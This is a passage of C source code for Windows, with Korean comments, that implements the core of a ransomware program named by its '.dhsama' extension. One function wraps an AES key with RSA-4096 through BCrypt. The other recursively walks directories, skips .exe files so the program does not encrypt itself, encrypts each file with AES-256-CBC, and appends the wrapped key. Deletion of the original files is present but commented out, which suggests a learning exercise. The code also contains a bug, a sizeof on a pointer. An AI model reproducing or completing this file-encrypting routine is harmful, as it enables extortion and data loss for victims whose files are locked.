int rsa_enc(BYTE* plaintext, int plaintext_size, BYTE** ciphertext, BYTE* n, BYTE* e) {
	NTSTATUS status = 0;

	DWORD	ciphertext_length = 0;
	DWORD	buffer_size = 0;

	//0. 키 핸들, 블롭 생성
	BCRYPT_KEY_HANDLE pub_handle = NULL;
	RSA_PublicKey_BLOB* pub = NULL;
	pub = (RSA_PublicKey_BLOB*)(calloc)(1, sizeof(RSA_PublicKey_BLOB));
	if (pub == NULL) { printf("0번 오류\n"); return 0; }

	pub->Magic = BCRYPT_RSAPUBLIC_MAGIC;
	pub->BitLength = 4096;
	pub->cbPublicExp = 3;
	pub->cbModulus = 512;
	pub->cbPrime1 = 0;
	pub->cbPrime2 = 0;
	memcpy(pub->PublicExponent, e, 3);
	memcpy(pub->Modulus, n, 512);

	//pdf의 순서와 약간 다릅니다.
	//1. BCRYPT_RSA_ALG_HANDLE
	BCRYPT_ALG_HANDLE enc_handle = BCRYPT_RSA_ALG_HANDLE;

	//2. BCryptImportKeyPair
	//알고리즘 핸들 / - / 키 블롭 타입 / 키 핸들 / 키 블롭 / 키 블롭 크기 / 플래그
	status = BCryptImportKeyPair(enc_handle, NULL, BCRYPT_RSAPUBLIC_BLOB, &pub_handle, (PBYTE)pub, RSA_PublicKey_BLOB_Size, BCRYPT_NO_KEY_VALIDATION);
	if (!NT_SUCCESS(status)) { printf("2번 오류\n"); return 0; }

	//3. BCryptEncrypt - ciphertext 길이 계산
	//키 핸들 / plaintext / plaintext 크기 / 패딩 포인터 / IV 포인터 / IV 크기 / ciphertext 버퍼 / 버퍼 크기 / 복사된 값 크기 / 패딩 플래그
	status = BCryptEncrypt(pub_handle, plaintext, sizeof(plaintext), NULL, NULL, 0, NULL, 0, &ciphertext_length, BCRYPT_PAD_PKCS1);
	if (!NT_SUCCESS(status)) { printf("3번 오류\n"); return 0; }

	//4. BCryptEncrypt - 암호화
	//키 핸들 / plaintext / plaintext 크기 / 패딩 포인터 / IV 포인터 / IV 크기 / ciphertext 버퍼 / 버퍼 크기 / 복사된 값 크기 / 패딩 플래그
	*ciphertext = (PBYTE)calloc(ciphertext_length, sizeof(BYTE));
	if (*ciphertext == NULL) return 0;
	status = BCryptEncrypt(pub_handle, plaintext, plaintext_size, NULL, NULL, 0, *ciphertext, ciphertext_length, &buffer_size, BCRYPT_PAD_PKCS1);
	if (!NT_SUCCESS(status)) { printf("4번 오류\n"); return 0; }

	/*
	//5. 암호문 출력
	ciphertext_length = buffer_size;
	printf("<Encrypted>\n");
	for (int i = 0; i < ciphertext_length; i++) {
		printf("%02X ", ciphertext[i]);
	}
	*/

	//6. 키 폐기
	BCryptDestroyKey(pub_handle);
	free(pub);

	//7. 알고리즘 닫기
	BCryptCloseAlgorithmProvider(enc_handle, 0);
	return ciphertext_length;
}

#define MAX_PATH 1000
#define MAX_COUNT 100000
#define CRT_SECURE_NO_WARNINGS

#pragma warning(disable:4996)

void file_search_and_encryption(char* directory, BYTE* key, int key_size, BYTE* nonce, int nonce_size, BYTE* encrypted_key, int encrypted_key_size, int* filecount) {
	WIN32_FIND_DATA finddata;
	HANDLE hfind;

	char path[MAX_PATH];
	sprintf(path, "%s\\*", directory);

	hfind = FindFirstFileA(path, &finddata);
	if (hfind == INVALID_HANDLE_VALUE) {
		printf("Error: %d\n", GetLastError());
		return;
	}

	do {
		if (!strcmp(finddata.cFileName, ".") || !strcmp(finddata.cFileName, "..")) continue;
		//랜섬코드 자신을 암호화하지 않게 함
		else if (!strcmp(finddata.cFileName + strlen(finddata.cFileName) - 4, ".exe")) continue;
		//한번 암호화한 파일 다시 암호화하지 않게 함
		else if (!strcmp(finddata.cFileName + strlen(finddata.cFileName) - 7, ".dhsama")) continue;

		char input_name[MAX_PATH];
		sprintf(input_name, "%s\\%s", directory, finddata.cFileName);

		//디렉터리이면 재귀호출(즉, DFS)
		if (finddata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			file_search_and_encryption(input_name, key, key_size, nonce, nonce_size, encrypted_key, encrypted_key_size, filecount);
		}

		else {
			(*filecount)++;
			//파일 열기
			FILE* input = fopen(input_name, "rb");
			
			if (!input) { printf("파일 열기 오류"); return; }
			else printf("%dth:\t%s 암호화...", *filecount, input_name);

			//파일 크기 저장
			fseek(input, 0, SEEK_END);
			int pt_size = ftell(input);
			fseek(input, 0, SEEK_SET);

			//pt 할당, 내용 저장
			BYTE* pt = (PBYTE)calloc(pt_size, sizeof(BYTE));
			if (pt == NULL) return;
			fread(pt, 1, pt_size, input);
			fclose(input);

			//ct 할당, AES-256-CBC 암호화
			BYTE* ct = NULL;
			int ct_size = aes_enc(pt, pt_size, &ct, key, key_size, nonce);

			//암호화 파일 저장
			char output_name[MAX_PATH];
			sprintf(output_name, "%s.dhsama", input_name);

			FILE* output = fopen(output_name, "wb");
			fwrite(ct, 1, ct_size, output);
			fwrite(encrypted_key, 1, encrypted_key_size, output);
			fwrite(nonce, 1, nonce_size, output);
			fclose(output);

			//pt, ct 해제
			free(pt);
			free(ct);

			//원본파일 삭제
			/*
			if (DeleteFileA(input_name)) printf("완료! (원본 파일 삭제 성공!)\n");
			else {printf("완료! (원본 파일 삭제 실패: %d)\n", GetLastError());}
			*/
			printf("\n");
		}
	} while (FindNextFileA(hfind, &finddata) && (*filecount < MAX_COUNT));

	FindClose(hfind);
}

